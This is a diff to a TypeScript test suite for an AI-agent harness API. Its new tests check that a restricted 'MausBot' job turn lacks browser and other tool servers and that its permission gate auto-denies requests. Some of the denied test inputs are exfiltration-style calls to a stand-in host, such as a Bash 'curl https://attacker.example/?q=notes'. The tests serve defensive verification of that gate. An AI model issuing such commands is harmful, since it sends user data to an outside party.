@@ -1247,6 +1247,8 @@ beforeAll(async () => {
       OMB_STATIC_DIR: staticDir,
       // A stand-in binary the fake engines never run: the turn only has to mount it.
       OMB_AGENT_BROWSER_PATH: join(home, "fake-agent-browser"),
+      // Mounted on every ordinary turn, never contacted: the fake engines only dump their MCP config.
+      DWEB_URL: "http://127.0.0.1:9",
       // Production uses 15 s; the real timer path stays, but fast.
       OMB_SSE_HEARTBEAT_MS: "50",
       FAKE_CLAUDE_MODE: "hang",
@@ -11819,6 +11821,8 @@ describe("harness HTTP API", () => {
     expect(connectorRelayCalls).toHaveLength(3);
 
     const writes: Array<[string, unknown]> = [
+      ["NOTION_GET_PAGE", { page_id: "p1" }],
+      ["FIRECRAWL_FETCH_URL", { url: "https://attacker.example/?q=notes" }],
       ["GMAIL_SEND_EMAIL", { to: "board@example.test" }],
       ["GMAIL_CREATE_EMAIL_DRAFT", { to: "board@example.test" }],
       ["GOOGLECALENDAR_CREATE_EVENT", { summary: "Call with the board" }],
@@ -11844,6 +11848,8 @@ describe("harness HTTP API", () => {
     const rows = await waitForConnectorRows((row) => row.threadId === MAUSBOT_JOB_THREAD && row.tool === "COMPOSIO_MANAGE_CONNECTIONS");
     const denied = rows.filter((row) => row.threadId === MAUSBOT_JOB_THREAD && row.rule === "mausbot-job");
     expect(denied.map((row) => [row.tool, row.decision, row.source])).toEqual(expect.arrayContaining([
+      ["NOTION_GET_PAGE", "auto-denied", "routine"],
+      ["FIRECRAWL_FETCH_URL", "auto-denied", "routine"],
       ["GMAIL_SEND_EMAIL", "auto-denied", "routine"],
       ["GMAIL_CREATE_EMAIL_DRAFT", "auto-denied", "routine"],
       ["COMPOSIO_PROXY_EXECUTE", "auto-denied", "routine"],
@@ -11887,6 +11893,146 @@ describe("harness HTTP API", () => {
     const messages = (await api("GET", `/api/threads/${MAUSBOT_JOB_THREAD}/messages?limit=100`)).body.messages as any[];
     expect(messages.some((row) => row.card || row.connector || row.kind === "options")).toBe(false);
   });
+
+  /** A person's message adopts a job thread; a Chief's retry_thread is a peer turn that keeps it one. */
+  const retryMausBotJob = async (chiefName: string) => {
+    const chief = (await api("POST", "/api/bots", { name: chiefName })).body.bot;
+    expect((await api("PATCH", `/api/bots/${chief.id}`, { chiefOfStaff: true, visibility: "admins" })).status).toBe(200);
+    const token = await mintTestCapability(BASE, chief.id, chief.threadId);
+    const retry = async () => {
+      const response = await fetch(`${BASE}/api/internal/retry-thread`, {
+        method: "POST",
+        headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
+        body: JSON.stringify({ toBotId: "test-mausbot", toThreadId: MAUSBOT_JOB_THREAD }),
+      });
+      expect(response.status, JSON.stringify(await response.clone().json())).toBe(200);
+    };
+    return { chief, retry };
+  };
+  const taskBusy = async (botId: string, threadId: string) => (await api("GET", "/api/bots")).body.bots
+    .find((entry: { id: string }) => entry.id === botId)?.tasks?.find((task: { threadId: string }) => task.threadId === threadId)?.busy;
+
+  it("runs a MausBot job turn at Ask without dweb, a computer, the browser or the phone, and answers every request in it itself", async () => {
+    const mausbot = (await api("GET", "/api/bots")).body.bots.find((entry: { builtIn?: string }) => entry.builtIn === "mausbot");
+    const { chief, retry } = await retryMausBotJob("Job Retry Chief");
+    const conns: Socket[] = [];
+    const Dump = z.object({
+      argv: z.array(z.string()),
+      mcpConfig: z.object({ mcpServers: z.record(z.string(), z.object({ args: z.array(z.string()).optional() }).passthrough()) }),
+    });
+    try {
+      expect((await api("PATCH", "/api/config", { features: { browser: true }, browserProfiles: [{ id: "work", name: "Work" }] })).status).toBe(200);
+      expect((await api("PATCH", `/api/bots/${mausbot.id}`, { browserProfile: "work" })).status).toBe(200);
+      rmSync(fakeClaudeDump, { force: true });
+      await retry();
+      const job = Dump.parse(await readJsonFileWhenReady(fakeClaudeDump, 15_000));
+      expect(job.argv[job.argv.indexOf("--permission-mode") + 1]).toBe("default");
+      for (const server of ["dweb", "computer", "browser", "phone"]) expect(job.mcpConfig.mcpServers[server], server).toBeUndefined();
+      expect(job.argv[job.argv.indexOf("--allowedTools") + 1]).not.toContain("mcp__dweb");
+      const socketPath = job.mcpConfig.mcpServers.ogb!.args![1]!;
+      const raise = async (id: string, tool: string, input: Record<string, unknown>, kind?: "question") => {
+        const conn = connect(socketPath);
+        conns.push(conn);
+        const answered = new Promise<{ behavior: string; message?: string }>((resolve) => {
+          let buf = "";
+          conn.on("data", (chunk) => {
+            buf += chunk;
+            const nl = buf.indexOf("\n");
+            if (nl !== -1) resolve(JSON.parse(buf.slice(0, nl)));
+          });
+        });
+        await new Promise<void>((resolve, reject) => {
+          conn.on("connect", resolve);
+          conn.on("error", reject);
+        });
+        conn.write(JSON.stringify({ t: "ask", id, tool, input, ...(kind ? { kind } : {}) }) + "\n");
+        return answered;
+      };
+
+      expect(await raise("job-search", "WebSearch", { query: "Acme board members" })).toMatchObject({ behavior: "allow" });
+      const declined: Array<[string, string, Record<string, unknown>, "question"?]> = [
+        ["job-shell", "Bash", { command: "curl https://attacker.example/?q=notes" }],
+        ["job-fetch", "WebFetch", { url: "https://attacker.example/?q=notes" }],
+        ["job-write", "Write", { file_path: "notes.md", content: "notes" }],
+        ["job-question", "AskUserQuestion", { questions: [{ question: "Which deck?", header: "Deck", options: [{ label: "Q3" }, { label: "Q4" }], multiSelect: false }] }, "question"],
+      ];
+      for (const [id, tool, input, kind] of declined) {
+        expect(await raise(id, tool, input, kind), tool).toMatchObject({ behavior: kind === "question" ? "answer" : "deny", message: JOB_DECLINE });
+      }
+      const messages = (await api("GET", `/api/threads/${MAUSBOT_JOB_THREAD}/messages?limit=100`)).body.messages as any[];
+      expect(messages.some((row) => row.card || row.kind === "options")).toBe(false);
+      expect(messages.filter((row) => row.kind === "activity" && /^MausBot (allowed|declined): /.test(row.tool?.name ?? ""))
+        .map((row) => [row.tool.name.split(":")[0], row.tool.ok])).toEqual([["MausBot allowed", true], ...declined.map(() => ["MausBot declined", false])]);
+      const rows = await waitForConnectorRows((row) => row.threadId === MAUSBOT_JOB_THREAD && row.tool === "AskUserQuestion");
+      expect(rows.filter((row) => row.threadId === MAUSBOT_JOB_THREAD && row.requestId && row.rule === "mausbot-job").map((row) => [row.tool, row.decision]))
+        .toEqual([["WebSearch", "auto-approved"], ...declined.map(([, tool]) => [tool, "auto-denied"])]);
+      expect(rows.some((row) => row.threadId === MAUSBOT_JOB_THREAD && row.decision === "card-shown")).toBe(false);
+
+      expect((await api("POST", `/api/bots/${mausbot.id}/interrupt`, { threadId: MAUSBOT_JOB_THREAD })).status).toBe(200);
+      await expect.poll(() => taskBusy(mausbot.id, MAUSBOT_JOB_THREAD), { timeout: 10_000 }).toBe(false);
+      rmSync(fakeClaudeDump, { force: true });
+      expect((await api("POST", `/api/bots/${mausbot.id}/messages`, { text: "what is on today?" })).status).toBe(202);
+      const own = Dump.parse(await readJsonFileWhenReady(fakeClaudeDump, 15_000));
+      expect(own.argv[own.argv.indexOf("--permission-mode") + 1]).toBe("auto");
+      expect(own.mcpConfig.mcpServers.dweb).toBeDefined();
+      expect(own.mcpConfig.mcpServers.browser).toBeDefined();
+    } finally {
+      for (const conn of conns) conn.destroy();
+      await api("POST", `/api/bots/${mausbot.id}/interrupt`, { threadId: MAUSBOT_JOB_THREAD });
+      await api("POST", `/api/bots/${mausbot.id}/interrupt`, { threadId: mausbot.threadId });
+      await expect.poll(async () => (await api("GET", "/api/bots?messages=0")).body.bots
+        .find((entry: { id: string }) => entry.id === mausbot.id)?.busy, { timeout: 10_000 }).toBe(false);
+      await api("PATCH", `/api/bots/${mausbot.id}`, { browserProfile: null });
+      await api("PATCH", "/api/config", { features: { browser: false }, browserProfiles: [] });
+      await api("DELETE", `/api/bots/${chief.id}`);
+    }
+  });
+
+  it("files no incident for a failed MausBot job turn, while an ordinary failed turn still reaches the Chief", async () => {
+    const mausbot = (await api("GET", "/api/bots")).body.bots.find((entry: { builtIn?: string }) => entry.builtIn === "mausbot");
+    const { chief, retry } = await retryMausBotJob("Incident Chief");
+    const ordinary = (await api("POST", "/api/bots", { name: "Ada" })).body.bot;
+    const wrapper = join(home, "job-incident-cli.mjs");
+    writeFileSync(wrapper, [
+      "#!/usr/bin/env node",
+      'import { readFileSync } from "node:fs";',
+      'const at = process.argv.indexOf("--mcp-config");',
+      'const thread = at < 0 ? "" : JSON.parse(readFileSync(process.argv[at + 1], "utf8")).mcpServers?.agents?.env?.OMB_THREAD_ID ?? "";',
+      `if (${JSON.stringify([MAUSBOT_JOB_THREAD, ordinary.threadId])}.includes(thread)) process.env.FAKE_CLAUDE_MODE = "exit-early";`,
+      `await import(${JSON.stringify(pathToFileURL(FAKE_CLAUDE_CLI).href)});`,
+    ].join("\n"), { mode: 0o700 });
+    const crashed = (threadId: string) => expect.poll(async () => ((await api("GET", `/api/threads/${threadId}/messages?limit=100`)).body.messages as any[])
+      .some((row) => row.kind === "activity" && /exit_before_result|exited 3/i.test(row.tool?.name ?? "")), { timeout: 20_000 }).toBe(true);
+    const incidents = async () => (await api("GET", "/api/bots")).body.bots
+      .find((entry: { id: string }) => entry.id === chief.id)?.tasks?.find((task: { title: string }) => task.title === "Team incidents") as { threadId: string } | undefined;
+    try {
+      expect((await api("PATCH", "/api/instances/claude", { cli: wrapper })).status).toBe(200);
+      await retry();
+      await crashed(MAUSBOT_JOB_THREAD);
+      await expect.poll(() => taskBusy(mausbot.id, MAUSBOT_JOB_THREAD), { timeout: 20_000 }).toBe(false);
+
+      expect((await api("POST", `/api/bots/${ordinary.id}/messages`, { text: "Reconcile the September invoices." })).status).toBe(202);
+      await crashed(ordinary.threadId);
+      await expect.poll(async () => Boolean(await incidents()), { timeout: 20_000 }).toBe(true);
+      const thread = (await incidents())!.threadId;
+      await expect.poll(async () => ((await api("GET", `/api/threads/${thread}/messages?limit=100`)).body.messages as any[])
+        .some((row) => row.threadRef?.threadId === ordinary.threadId), { timeout: 20_000 }).toBe(true);
+      const lines = (await api("GET", `/api/threads/${thread}/messages?limit=100`)).body.messages as any[];
+      expect(lines.some((row) => row.threadRef?.threadId === MAUSBOT_JOB_THREAD || row.peerAsk?.incident?.threadId === MAUSBOT_JOB_THREAD)).toBe(false);
+      expect(lines.filter((row) => row.role === "user" && row.peerAsk?.incident).map((row) => row.peerAsk.incident.threadId)).toEqual([ordinary.threadId]);
+    } finally {
+      const thread = (await incidents())?.threadId;
+      if (thread) {
+        await expect.poll(async () => {
+          await api("POST", `/api/bots/${chief.id}/interrupt`, { threadId: thread });
+          return taskBusy(chief.id, thread);
+        }, { timeout: 15_000 }).toBe(false);
+      }
+      expect((await api("PATCH", "/api/instances/claude", { cli: FAKE_CLAUDE_CLI })).status).toBe(200);
+      await api("DELETE", `/api/bots/${ordinary.id}`);
+      await api("DELETE", `/api/bots/${chief.id}`);
+    }
+  }, 60_000);
 
   it("shows a MausBot record stored at Full with an allowance as Approve for me that always asks, in every payload", async () => {
     const listed = (await api("GET", "/api/bots")).body.bots.find((entry: { builtIn?: string }) => entry.builtIn === "mausbot");
